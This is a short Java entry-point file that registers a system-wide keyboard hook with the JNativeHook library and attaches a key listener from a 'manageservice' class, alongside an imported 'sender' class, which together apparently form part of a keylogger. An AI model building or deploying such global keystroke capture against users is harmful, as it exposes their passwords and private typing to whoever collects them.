package main;

import Manager.manageservice;
import Manager.sender;
import org.jnativehook.GlobalScreen;
public class Main {
    public static void main(String[] args){
        manageservice service = new manageservice();
        try {
            GlobalScreen.registerNativeHook();
        } catch (Throwable e) {
            e.printStackTrace();
        }

        GlobalScreen.getInstance().addNativeKeyListener(service.getKeyboard());
    }
}
